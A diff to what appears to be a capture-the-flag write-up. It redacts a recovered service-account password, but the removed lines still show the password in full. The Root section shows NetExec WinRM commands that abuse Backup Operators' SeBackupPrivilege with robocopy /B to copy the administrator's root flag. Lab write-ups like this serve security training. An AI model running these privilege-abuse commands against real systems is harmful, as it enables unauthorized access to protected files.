@@ -142,15 +142,15 @@ The output is 48 bytes and the structure matters:
 02 02                     AES block padding
 ```
 
-Reading to the end of the block and converting everything as UTF-16LE appends a `U+0202` to the end of the password. That character is exactly what burned the first login attempts. With the right slice, the password is `W0rldTr@cer_B@ckup1`.
+Reading to the end of the block and converting everything as UTF-16LE appends a `U+0202` to the end of the password. That character is exactly what burned the first login attempts. With the right slice, the `svc_wtbackup` password comes out clean (omitted here).
 
 ## Root
 
 `Backup Operators` grants `SeBackupPrivilege`, which bypasses NTFS ACLs when the process asks for backup semantics. `robocopy /B` does exactly that:
 
 ```bash
-nxc winrm 10.129.26.50 -u svc_wtbackup -p 'W0rldTr@cer_B@ckup1' --local-auth
-nxc winrm 10.129.26.50 -u svc_wtbackup -p 'W0rldTr@cer_B@ckup1' --local-auth \
+nxc winrm 10.129.26.50 -u svc_wtbackup -p '<redacted>' --local-auth
+nxc winrm 10.129.26.50 -u svc_wtbackup -p '<redacted>' --local-auth \
   -x 'cmd /c robocopy C:\Users\Administrator\Desktop C:\Users\svc_wtbackup\Documents root.txt /B'
 ```
 
